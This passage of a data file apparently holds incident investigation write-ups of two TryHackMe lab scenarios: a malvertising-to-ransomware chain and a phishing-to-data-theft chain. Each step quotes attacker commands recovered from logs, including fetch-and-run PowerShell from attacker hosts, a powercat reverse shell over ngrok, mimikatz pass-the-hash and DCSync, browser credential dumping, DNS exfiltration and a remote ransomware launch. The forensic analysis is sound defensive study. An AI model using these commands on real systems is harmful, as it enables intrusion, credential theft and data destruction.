                summary: "This report documents a critical corporate network compromise resulting in active directory domination and a ransomware deployment on two work stations. The attack chain initiated via Malvertising, where a user seeking software unknowingly downloaded a weaponized installer from a typosquatted domain. The attacker immediately achieved local administrative privileges and deployed a persistent Windows service to establish a Command and Control (C2) channel. Through extensive credential dumping, internal active directory discovery, and lateral movement, the threat actor successfully hijacked high-privileged accounts before deploying a ransomware payload (bomb.exe) to encrypt sensitive data assets across multiple workstations.",
                macrophases: [
                    {
                        name: "Initial Phase",
                        steps: [
                            {
                                title: "1 - INITIAL ACCESS",
                                desc: "The user, needing to extract a file, searched for 7-Zip and unknowingly clicked a sponsored link leading to a typosquatted domain 7zipp[.]org.",
                                code: `C:\\Users\\perry.parsons\\Downloads\\7z2301-x64.msi
hxxp[://]www[.]7zipp[.]org/a/7z2301-x64[.]msi
IP: 206.189.34.218`
                            },
                            {
                                title: "2 - EXECUTION & PRIVILEGE ESCALATION",
                                desc: "The native Windows utility msiexec.exe launched the rogue installer. Upon execution, the installer took advantage of system privileges to elevate the threat actor to NT AUTHORITY\SYSTEM, opened a fileless PowerShell connection to retrieve a second-stage payload.",
                                code: `"C:\\Windows\\System32\\msiexec.exe" /i "C:\\Users\\perry.parsons\\Downloads\\7z2301-x64.msi”
powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)`
                            },
                            {
                                title: "3 - DEFENSE EVASION",
                                desc: "The script downloads and installs the legitimate 7-Zip application in the background to mask the malicious behavior and avoid user suspicion.",
                                code: "iwr hxxps[://]www[.]7-zip[.]org/a/7z2301-x64[.]exe -outfile C:\\Windows\\Temp\\7zlegit.exe"
                            }
                        ]
                    },
                    {
                        name: "Active Phase",
                        steps: [
                            {
                                title: "4 - PERSISTENCE",
                                desc: "A 7zipp.exe file is downloaded and attributed to a newly created service 7zservice that will execute on every start for a persistent foothold. The service is then executed, it downloads a 7zip.dll file which when executed connects back to the attacker’s server.",
                                code: `C:\\Program Files\\7-Zip\\7zipp.exe
"C:\\Windows\\system32\\sc.exe" create 7zService binpath= "C:\\Program Files\\7-zip\\7zipp.exe" start=auto obj=LocalSystem
"C:\\Windows\\system32\\sc.exe" start 7zService

"C:\\Windows\\system32\\rundll32.exe" "C:\\Program Files\\7-zip\\7zipp.dll",Start
-C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1 -useb); Invoke-Nanodump;`
                            },
                            {
                                title: "5 - CREDENTIAL ACCESS & ACTIVE DIRECTORY RECONNAISSANCE",
                                desc: "The attacker begins harvesting credentials and mapping the corporate domain. The attacker ran Invoke-NanoDump directly in memory to dump LSASS process credentials, hiding the output file as a fake event log (trash.evtx), then used Invoke-PowerExtract to parse it. SharpHound was executed to map the entire Active Directory structure and find attack paths. The attacker downloaded mimikatz to harvest cleartext secrets and successfully performed a Pass-the-Hash (sekurlsa::pth) attack to hijack the identity and active session of domain user james.cromwell.",
                                code: `-C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1 -useb); Invoke-Nanodump;
-C iex(iwr http://206.189.34.218/a/pwrex.ps1 -useb); Invoke-PowerExtract -PathToDMP C:\\windows\\temp\\trash.evtx;

-C iex(iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -useb); Invoke-Bloodhound -c all

-C iwr https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile m.zip
-C Expand-Archive m.zip
"C:\\Windows\\Temp\\m\\x64\\mimikatz.exe" "sekurlsa::pth /user:james.cromwell /domain:swiftspendfinancial.thm /ntlm:B852A0B8BD4E00564128E0A5EA2BC4CF /run:powershell.exe" exit`
                            },
                            {
                                title: "6 - LATERAL MOVEMENT",
                                desc: "The attacker logged in to the james.cromwell account and modified the anna.jones user  password via the command line. The attacker imported PowerView to perform domain queries and update passwords through secure PowerShell inputs rather than noisy command lines. Logging into anna.jones's profile on a separate station, the attacker ran SharpChromium to extract saved credentials, passwords, and cookies from web browsers.",
                                code: `C:\\Windows\\system32\\net1  users anna.jones pwn3dpw!!! /domain

-C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-Domain
-C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-DomainGroup
-C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Set-DomainUserPassword -Identity anna.jones -AccountPassword (ConvertTo-SecureString 'pwn3dpw!!!' -AsPlaintext -Force) -Domain swiftspendfinancial.thm -Verbose

"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" iwr http://www.7zipp.org/a/7zipp.dll -outfile C:\\Users\\anna.jones\\Downloads\\7zip.dll

-C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1 -useb); Invoke-SharpChromium -Command 'all'`
                            },
                        ]
                    },
                    {
                        name: "Final Phase",
                        steps: [
                            {
                                title: "7 - DOMAIN PERSISTENCE",
                                desc: "Using previously harvested IT Administrator credentials (itadmin), the attacker used PowerView to add anna.jones into the highly privileged AD Recovery security group. The attacker used SharpKatz and mimikatz, impersonating a Domain Controller to pull the password hashes of damian.hall from the Active Directory database.",
                                code: `-C $username='SSF\\itadmin'; $password='NoO6@39Sk0!'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $new_creds = New-Object System.Management.Automation.PSCredential $username, $securePassword; iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Add-DomainGroupMember -Identity 'AD Recovery -Members anna.jones -Credential $new_creds -Verbose

-C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpKatz.ps1 -useb); Invoke-Sharpkatz -Command '--Command dcsync --Domain swiftspendfinancial.thm --DomainController DC-01.swiftspendfinancial.thm --User damian.hall'
-C .\\mimikatz.exe 'sekurlsa::pth /user:damian.hall /domain:swiftspendfinancial.thm /ntlm:eb1892cb0a163e122bc71be173c66fed /run:powershell.exe' 'exit’`
                            },
                            {
                                title: "8 - ACTION ON OBJECTIVES",
                                desc: "The attacker used PowerShell remote execution (Invoke-Command) to deploy a  ransomware bomb.exe to target stations WKSTN-02 and WKSTN-03and encrypt high-value files in both users' documents directories.",
                                code: `C Invoke-Command -ScriptBlock {cd C:\\Users\\anna.jones; iwr http://www.7zipp.org/a/777bomb.exe -outfile bomb.exe; pwd; .\\bomb.exe; ls -rec -file } -ComputerName WKSTN-02.swiftspendfinancial.thmC Invoke-Command -ScriptBlock {cd C:\\Users\\perry.parsons\\;.\\bomb.exe;ls -rec -file} -ComputerName WKSTN-03.swiftspendfinancial.thm

ParameterBinding(Out-Default): name="InputObject"; value="[] Encrypting: Documents\\Audit_Reports\\Network_Audit_Report.pdf"
ParameterBinding(Out-Default): name="InputObject"; value="[] Encrypting: Documents\\Audit_Reports\\Security_Audit_Report.pdf"`
                            }
                        ]
                    }
                ]
            },
            {
                id: "thm-hunt-me1",
                category: "investigation",
                name: "Hunt Me I (TryHackme)",
                severity: "Critical",
                summary: "On September 15, 2023, a targeted phishing incident led to the full compromise of a SwiftSpend workstation and subsequent data exfiltration. An executive fell victim to a spoofed invoice email, downloading a malicious archive that executed a fileless PowerShell payload. The attacker established a Command and Control (C2) channel, conducted internal network enumeration, and mapped a sensitive financial file share. Utilizing living-off-the-land binaries, the threat actor collected proprietary corporate files and successfully exfiltrated them before executing anti-forensic commands to clear internet artifacts.",
                macrophases: [
                    {
                        name: "Initial Phase",
                        steps: [
                            {
                                title: "1 - INITIAL ACCESS",
                                desc: "A user downloaded a spoofed zip file received by email from which a  suspicious double extension .lnk file is extracted.",
                                code: `Image: C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE
file.name: Invoice_AT_2023-227.zip
file.path: C:\\Users\\michael.ascot\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\UP4KOJQB\\Invoice_AT_2023-227.zip

file.name: Payment_Invoice.pdf.lnk.lnk`
                            },
                            {
                                title: "2 - EXECUTION",
                                desc: "The .lnk file executed a powershell process to dynamically download and execute the powercat.ps1 script directly into memory, establishing an outbound reverse shell over a custom port via an Ngrok tunnel.",
                                code: `"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell"`
                            }
                        ]
                    },
                    {
                        name: "Active Phase",
                        steps: [
                            {
                                title: "3 - DISCOVERY",
                                desc: "With this command and control connection established the attacker proceeds to enumerate the system using the powerview.ps1 script.",
                                code: `”whoami” “whoami /priv” “net user” “net localgroup”

Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1 -Outfile PowerView.ps1`
                            },
                            {
                                title: "4 - LATERAL MOVEMENT",
                                desc: "The attacker connected to the financial records file share",
                                code: '"C:\\Windows\\system32\\net.exe" use Z: \\\\FILESRV-01\\SSF-FinancialRecords'
                            },
                            {
                                title: "5 - DATA COLLECTION",
                                desc: 'An “exfiltration” file was created , two files were extracted from the file share and moved to the exfiltration file using Robocopy.exe, they were then compressed into a .zip archive for exfiltration.',
                                code: `C:\\Users\\michael.ascot\\Downloads\\exfiltration

"C:\\Windows\\system32\\Robocopy.exe" . C:\\Users\\michael.ascot\\downloads\\exfiltration /E
C:\\Users\\michael.ascot\\Downloads\\exfiltration\\ClientPortfolioSummary.xlsx
C:\\Users\\michael.ascot\\Downloads\\exfiltration\\InvestorPresentation2023.pptx
C:\\Users\\michael.ascot\\Downloads\\exfiltration\\exfilt8me.zip`
                            }
                        ]
                    },
                    {
                        name: "Final Phase",
                        steps: [
                            {
                                title: "6 - DATA EXFILTRATION",
                                desc: "The data is encoded and divided to be sent in subdomains of haz4rdw4re.io using multiple nslookup queries. ",
                                code: `"C:\\Windows\\system32\\nslookup.exe" HhlO5R8AAAAdAAAAHQAAAAAAAAAAAA.haz4rdw4re.io`
                            },
                            {
                                title: "7 - DEFENSE EVASION",
                                desc: "The attacker used rundll32.exe to clear his tracks calling inetcpl.cpl with specific flags, clearing the generated system and browser cache, logs and cookies.",
                                code: `C:\\Windows\\system32\\rundll32.exe C:\\Windows\\system32\\inetcpl.cpl,ClearMyTracksByProcess Flags:8388616 WinX:0 WinY:0 IEFrame:0000000000000000
C:\\Windows\\system32\\rundll32.exe C:\\Windows\\system32\\inetcpl.cpl,ClearMyTracksByProcess Flags:276824072 WinX:0 WinY:0 IEFrame:0000000000000000`
                            }
                        ]
                    }
                ]
            }
        ]
    }


}